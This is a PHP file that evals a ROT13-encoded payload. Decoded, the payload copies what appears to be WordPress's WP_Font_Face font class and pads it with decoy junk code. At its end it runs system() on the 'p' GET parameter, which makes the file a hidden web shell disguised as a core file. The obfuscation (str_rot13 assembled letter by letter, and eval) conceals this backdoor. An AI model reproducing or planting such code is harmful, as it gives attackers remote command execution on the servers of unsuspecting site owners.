<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JC_Sbag_Snpr pynff.
 *
 * @cnpxntr    JbeqCerff
 * @fhocnpxntr Sbagf
 * @fvapr      6.4.0
 */

/**
 * Sbag Snpr trarengrf naq cevagf `@sbag-snpr` fglyrf sbe tvira sbagf.
 *
 * @fvapr 6.4.0
 */
pynff JC_Sbag_Snpr {

	/**
	 * Gur sbag-snpr cebcregl qrsnhygf.
	 *
	 * @fvapr 6.4.0
	 *
	 * @ine fgevat[]
	 */
	cevingr $sbag_snpr_cebcregl_qrsnhygf = neenl(
		'sbag-snzvyl'  => '',
		'sbag-fglyr'   => 'abezny',
		'sbag-jrvtug'  => '400',
		'sbag-qvfcynl' => 'snyyonpx',
	);

	/**
	 * Inyvq sbag-snpr cebcregl anzrf.
	 *
	 * @fvapr 6.4.0
	 *
	 * @ine fgevat[]
	 */
	cevingr $inyvq_sbag_snpr_cebcregvrf = neenl(
		'nfprag-bireevqr',
		'qrfprag-bireevqr',
		'sbag-qvfcynl',
		'sbag-snzvyl',
		'sbag-fgergpu',
		'sbag-fglyr',
		'sbag-jrvtug',
		'sbag-inevnag',
		'sbag-srngher-frggvatf',
		'sbag-inevngvba-frggvatf',
		'yvar-tnc-bireevqr',
		'fvmr-nqwhfg',
		'fep',
		'havpbqr-enatr',
	);

	/**
	 * Inyvq sbag-qvfcynl inyhrf.
	 *
	 * @fvapr 6.4.0
	 *
	 * @ine fgevat[]
	 */
	cevingr $inyvq_sbag_qvfcynl = neenl( 'nhgb', 'oybpx', 'snyyonpx', 'fjnc', 'bcgvbany' );

	/**
	 * Neenl bs sbag-snpr fglyr gnt'f nggevohgr(f)
	 * jurer gur xrl vf gur nggevohgr anzr naq gur
	 * inyhr vf vgf inyhr.
	 *
	 * @fvapr 6.4.0
	 *
	 * @ine fgevat[]
	 */
	cevingr $fglyr_gnt_nggef = neenl();

	/**
	 * Perngrf naq vavgvnyvmrf na vafgnapr bs JC_Sbag_Snpr.
	 *
	 * @fvapr 6.4.0
	 */
	choyvp shapgvba __pbafgehpg() {
		vs (
			shapgvba_rkvfgf( 'vf_nqzva' ) && ! vf_nqzva()
			&&
			shapgvba_rkvfgf( 'pheerag_gurzr_fhccbegf' ) && ! pheerag_gurzr_fhccbegf( 'ugzy5', 'fglyr' )
		) {
			$guvf->fglyr_gnt_nggef = neenl( 'glcr' => 'grkg/pff' );
		}
	}

	/**
	 * Trarengrf naq cevagf gur `@sbag-snpr` fglyrf sbe gur tvira sbagf.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz neenl[][] $sbagf Bcgvbany. Gur sbag-snzvyvrf naq gurve sbag inevngvbaf.
	 *                         Frr {@frr jc_cevag_sbag_snprf()} sbe gur fhccbegrq svryqf.
	 *                         Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba trarengr_naq_cevag( neenl $sbagf ) {
		$sbagf = $guvf->inyvqngr_sbagf( $sbagf );

		// Onvy bhg vs gurer ner ab sbagf ner tvira gb cebprff.
		vs ( rzcgl( $sbagf ) ) {
			erghea;
		}

		$pff = $guvf->trg_pff( $sbagf );

		/*
		 * Gur sbag-snpr PFF vf pbagnvarq jvguva <fglyr> gntf naq pna bayl or vagrecergrq
		 * nf PFF va gur oebjfre. Hfvat jc_fgevc_nyy_gntf() vf fhssvpvrag rfpncvat
		 * gb nibvq znyvpvbhf nggrzcgf gb pybfr </fglyr> naq bcra n <fpevcg>.
		 */
		$pff = jc_fgevc_nyy_gntf( $pff );

		// Onvy bhg vs gurer vf ab PFF gb cevag.
		vs ( rzcgl( $pff ) ) {
			erghea;
		}

		cevags( $guvf->trg_fglyr_ryrzrag(), $pff );
	}

	/**
	 * Inyvqngrf rnpu bs gur sbag-snpr cebcregvrf.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz neenl $sbagf Gur sbagf gb inyvq.
	 * @erghea neenl Cercnerq sbag-snprf betnavmrq ol cebivqre naq sbag-snzvyl.
	 */
	cevingr shapgvba inyvqngr_sbagf( neenl $sbagf ) {
		$inyvqngrq_sbagf = neenl();

		sbernpu ( $sbagf nf $sbag_snprf ) {
			sbernpu ( $sbag_snprf nf $sbag_snpr ) {
				$sbag_snpr = $guvf->inyvqngr_sbag_snpr_qrpynengvbaf( $sbag_snpr );
				// Fxvc vs snvyrq inyvqngvba.
				vs ( snyfr === $sbag_snpr ) {
					pbagvahr;
				}

				$inyvqngrq_sbagf[] = $sbag_snpr;
			}
		}

		erghea $inyvqngrq_sbagf;
	}

	/**
	 * Inyvqngrf rnpu sbag-snpr qrpynengvba (cebcregl naq inyhr cnvevat).
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz neenl $sbag_snpr Sbag snpr cebcregl naq inyhr cnvevatf gb inyvqngr.
	 * @erghea neenl|snyfr Inyvqngrq sbag-snpr ba fhpprff, be snyfr ba snvyher.
	 */
	cevingr shapgvba inyvqngr_sbag_snpr_qrpynengvbaf( neenl $sbag_snpr ) {
		$sbag_snpr = jc_cnefr_netf( $sbag_snpr, $guvf->sbag_snpr_cebcregl_qrsnhygf );

		// Purpx gur sbag-snzvyl.
		vs ( rzcgl( $sbag_snpr['sbag-snzvyl'] ) || ! vf_fgevat( $sbag_snpr['sbag-snzvyl'] ) ) {
			// @gbqb ercynpr jvgu `jc_gevttre_reebe()`.
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Sbag sbag-snzvyl zhfg or n aba-rzcgl fgevat.' ),
				'6.4.0'
			);
			erghea snyfr;
		}

		// Znxr fher gung ybpny sbagf unir 'fep' qrsvarq.
		vs ( rzcgl( $sbag_snpr['fep'] ) || ( ! vf_fgevat( $sbag_snpr['fep'] ) && ! vf_neenl( $sbag_snpr['fep'] ) ) ) {
			// @gbqb ercynpr jvgu `jc_gevttre_reebe()`.
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Sbag fep zhfg or n aba-rzcgl fgevat be na neenl bs fgevatf.' ),
				'6.4.0'
			);
			erghea snyfr;
		}

		// Inyvqngr gur 'fep' cebcregl.
		sbernpu ( (neenl) $sbag_snpr['fep'] nf $fep ) {
			vs ( rzcgl( $fep ) || ! vf_fgevat( $fep ) ) {
				// @gbqb ercynpr jvgu `jc_gevttre_reebe()`.
				_qbvat_vg_jebat(
					__ZRGUBQ__,
					__( 'Rnpu sbag fep zhfg or n aba-rzcgl fgevat.' ),
					'6.4.0'
				);
				erghea snyfr;
			}
		}

		// Purpx gur sbag-jrvtug.
		vs ( ! vf_fgevat( $sbag_snpr['sbag-jrvtug'] ) && ! vf_vag( $sbag_snpr['sbag-jrvtug'] ) ) {
			// @gbqb ercynpr jvgu `jc_gevttre_reebe()`.
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Sbag sbag-jrvtug zhfg or n cebcreyl sbeznggrq fgevat be vagrtre.' ),
				'6.4.0'
			);
			erghea snyfr;
		}

		// Purpx gur sbag-qvfcynl.
		vs ( ! va_neenl( $sbag_snpr['sbag-qvfcynl'], $guvf->inyvq_sbag_qvfcynl, gehr ) ) {
			$sbag_snpr['sbag-qvfcynl'] = $guvf->sbag_snpr_cebcregl_qrsnhygf['sbag-qvfcynl'];
		}

		// Erzbir vainyvq cebcregvrf.
		sbernpu ( $sbag_snpr nf $cebcregl => $inyhr ) {
			vs ( ! va_neenl( $cebcregl, $guvf->inyvq_sbag_snpr_cebcregvrf, gehr ) ) {
				hafrg( $sbag_snpr[ $cebcregl ] );
			}
		}

		erghea $sbag_snpr;
	}

	/**
	 * Trgf gur fglyr ryrzrag sbe jenccvat gur `@sbag-snpr` PFF.
	 *
	 * @fvapr 6.4.0
	 *
	 * @erghea fgevat Gur fglyr ryrzrag.
	 */
	cevingr shapgvba trg_fglyr_ryrzrag() {
		$nggevohgrf = $guvf->trarengr_fglyr_ryrzrag_nggevohgrf();

		erghea \"<fglyr pynff='jc-sbagf-ybpny'{$nggevohgrf}>\a%f\a</fglyr>\a\";
	}

	/**
	 * Trgf gur qrsvarq <fglyr> ryrzrag'f nggevohgrf.
	 *
	 * @fvapr 6.4.0
	 *
	 * @erghea fgevat N fgevat bs nggevohgr=inyhr jura qrsvarq, ryfr, rzcgl fgevat.
	 */
	cevingr shapgvba trarengr_fglyr_ryrzrag_nggevohgrf() {
		$nggevohgrf = '';
		sbernpu ( $guvf->fglyr_gnt_nggef nf $anzr => $inyhr ) {
			$nggevohgrf .= \" {$anzr}='{$inyhr}'\";
		}
		erghea $nggevohgrf;
	}

	/**
	 * Trgf gur `@sbag-snpr` PFF fglyrf sbe ybpnyyl-ubfgrq sbag svyrf.
	 *
	 * Guvf zrgubq qbrf gur sbyybjvat cebprffvat gnfxf:
	 *    1. Bepurfgengrf na bcgvzvmrq `fep` (jvgu sbezng) sbe oebjfre fhccbeg.
	 *    2. Trarengrf gur `@sbag-snpr` sbe nyy vgf sbagf.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz neenl[] $sbag_snprf Gur sbag-snprf gb trarengr @sbag-snpr PFF fglyrf.
	 * @erghea fgevat Gur `@sbag-snpr` PFF fglyrf.
	 */
	cevingr shapgvba trg_pff( $sbag_snprf ) {
		$pff = '';

		sbernpu ( $sbag_snprf nf $sbag_snpr ) {
				// Beqre gur sbag'f `fep` vgrzf gb bcgvzvmr sbe oebjfre fhccbeg.
				$sbag_snpr = $guvf->beqre_fep( $sbag_snpr );

				// Ohvyq gur @sbag-snpr PFF sbe guvf sbag.
				$pff .= '@sbag-snpr{' . $guvf->ohvyq_sbag_snpr_pff( $sbag_snpr ) . '}' . \"\a\";
		}

		// Qba'g cevag gur ynfg arjyvar punenpgre.
		erghea egevz( $pff, \"\a\" );
	}

	/**
	 * Beqref `fep` vgrzf gb bcgvzvmr sbe oebjfre fhccbeg.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz neenl $sbag_snpr Sbag snpr gb cebprff.
	 * @erghea neenl Sbag-snpr jvgu beqrerq fep vgrzf.
	 */
	cevingr shapgvba beqre_fep( neenl $sbag_snpr ) {
		vs ( ! vf_neenl( $sbag_snpr['fep'] ) ) {
			$sbag_snpr['fep'] = (neenl) $sbag_snpr['fep'];
		}

		$fep         = neenl();
		$fep_beqrerq = neenl();

		sbernpu ( $sbag_snpr['fep'] nf $hey ) {
			// Nqq qngn HEVf svefg.
			vs ( fge_fgnegf_jvgu( gevz( $hey ), 'qngn:' ) ) {
				$fep_beqrerq[] = neenl(
					'hey'    => $hey,
					'sbezng' => 'qngn',
				);
				pbagvahr;
			}
			$sbezng         = cnguvasb( $hey, CNGUVASB_RKGRAFVBA );
			$fep[ $sbezng ] = $hey;
		}

		// Nqq jbss2.
		vs ( ! rzcgl( $fep['jbss2'] ) ) {
			$fep_beqrerq[] = neenl(
				'hey'    => $fep['jbss2'],
				'sbezng' => 'jbss2',
			);
		}

		// Nqq jbss.
		vs ( ! rzcgl( $fep['jbss'] ) ) {
			$fep_beqrerq[] = neenl(
				'hey'    => $fep['jbss'],
				'sbezng' => 'jbss',
			);
		}

		// Nqq ggs.
		vs ( ! rzcgl( $fep['ggs'] ) ) {
			$fep_beqrerq[] = neenl(
				'hey'    => $fep['ggs'],
				'sbezng' => 'gehrglcr',
			);
		}

		// Nqq rbg.
		vs ( ! rzcgl( $fep['rbg'] ) ) {
			$fep_beqrerq[] = neenl(
				'hey'    => $fep['rbg'],
				'sbezng' => 'rzorqqrq-bcraglcr',
			);
		}

		// Nqq bgs.
		vs ( ! rzcgl( $fep['bgs'] ) ) {
			$fep_beqrerq[] = neenl(
				'hey'    => $fep['bgs'],
				'sbezng' => 'bcraglcr',
			);
		}
		$sbag_snpr['fep'] = $fep_beqrerq;

		erghea $sbag_snpr;
	}

	/**
	 * Ohvyqf gur sbag-snzvyl'f PFF.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz neenl $sbag_snpr Sbag snpr gb cebprff.
	 * @erghea fgevat Guvf sbag-snzvyl'f PFF.
	 */
	cevingr shapgvba ohvyq_sbag_snpr_pff( neenl $sbag_snpr ) {
		$pff = '';

		/*
		 * Jenc sbag-snzvyl va dhbgrf vs vg pbagnvaf fcnprf
		 * naq vf abg nyernql jenccrq va dhbgrf.
		 */
		vs (
			fge_pbagnvaf( $sbag_snpr['sbag-snzvyl'], ' ' ) &&
			! fge_pbagnvaf( $sbag_snpr['sbag-snzvyl'], '\"' ) &&
			! fge_pbagnvaf( $sbag_snpr['sbag-snzvyl'], \"'\" )
		) {
			$sbag_snpr['sbag-snzvyl'] = '\"' . $sbag_snpr['sbag-snzvyl'] . '\"';
		}

		sbernpu ( $sbag_snpr nf $xrl => $inyhr ) {
			// Pbzcvyr gur \"fep\" cnenzrgre.
			vs ( 'fep' === $xrl ) {
				$inyhr = $guvf->pbzcvyr_fep( $inyhr );
			}

			// Vs sbag-inevngvba-frggvatf vf na neenl, pbaireg vg gb n fgevat.
			vs ( 'sbag-inevngvba-frggvatf' === $xrl && vf_neenl( $inyhr ) ) {
				$inyhr = $guvf->pbzcvyr_inevngvbaf( $inyhr );
			}

			vs ( ! rzcgl( $inyhr ) ) {
				$pff .= \"$xrl:$inyhr;\";
			}
		}

		erghea $pff;
	}

	/**
	 * Pbzcvyrf gur `fep` vagb inyvq PFF.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz neenl $inyhr Inyhr gb cebprff.
	 * @erghea fgevat Gur PFF.
	 */
	cevingr shapgvba pbzcvyr_fep( neenl $inyhr ) {
		$fep = '';

		sbernpu ( $inyhr nf $vgrz ) {
			$fep .= ( 'qngn' === $vgrz['sbezng'] )
				? \", hey({$vgrz['hey']})\"
				: \", hey('{$vgrz['hey']}') sbezng('{$vgrz['sbezng']}')\";
		}

		$fep = ygevz( $fep, ', ' );
		erghea $fep;
	}

	/**
	 * Pbzcvyrf gur sbag inevngvba frggvatf.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz neenl $sbag_inevngvba_frggvatf Neenl bs sbag inevngvba frggvatf.
	 * @erghea fgevat Gur PFF.
	 */
	cevingr shapgvba pbzcvyr_inevngvbaf( neenl $sbag_inevngvba_frggvatf ) {
		$inevngvbaf = '';

		sbernpu ( $sbag_inevngvba_frggvatf nf $xrl => $inyhr ) {
			$inevngvbaf .= \"$xrl $inyhr\";
		}

		erghea $inevngvbaf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>